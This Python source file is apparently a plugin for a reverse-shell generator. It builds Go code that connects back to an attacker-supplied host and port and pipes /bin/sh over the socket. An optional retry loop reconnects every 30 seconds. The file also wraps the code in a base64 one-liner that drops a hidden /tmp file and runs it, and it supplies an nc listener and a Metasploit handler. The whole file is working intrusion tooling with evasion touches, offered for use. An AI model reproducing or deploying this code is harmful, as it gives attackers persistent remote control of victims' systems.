import base64
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler


class GolangGenerator(ShellGenerator):
    language = "golang"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = "go_run"
        tmp_name = self._var("shell", names)

        source = self._build_source(opts, names)
        encoded = base64.b64encode(source.encode()).decode()

        cmd = (
            f"echo {encoded} | base64 -d > /tmp/.{tmp_name}.go && "
            f"go run /tmp/.{tmp_name}.go"
        )

        listener = (
            f"rlwrap nc -lvnp {opts.lport}\n"
            f"# Requires 'go' to be installed on target"
        )

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=listener,
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
        )

    def _build_source(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        c = self._var("c", names)
        err = self._var("err", names)
        cmd = self._var("cmd", names)

        if opts.retry:
            return (
                'package main\n'
                'import("net";"os/exec";"time")\n'
                'func main(){\n'
                '    for{\n'
                f'        {c},{err}:=net.Dial("tcp","{opts.lhost}:{opts.lport}")\n'
                f'        if {err}==nil{{\n'
                f'            {cmd}:=exec.Command("/bin/sh")\n'
                f'            {cmd}.Stdin={c};{cmd}.Stdout={c};{cmd}.Stderr={c}\n'
                f'            {cmd}.Run()\n'
                '        }\n'
                '        time.Sleep(30*time.Second)\n'
                '    }\n'
                '}\n'
            )
        else:
            return (
                'package main\n'
                'import("net";"os/exec")\n'
                'func main(){\n'
                f'    {c},_:=net.Dial("tcp","{opts.lhost}:{opts.lport}")\n'
                f'    {cmd}:=exec.Command("/bin/sh")\n'
                f'    {cmd}.Stdin={c};{cmd}.Stdout={c};{cmd}.Stderr={c}\n'
                f'    {cmd}.Run()\n'
                '}\n'
            )
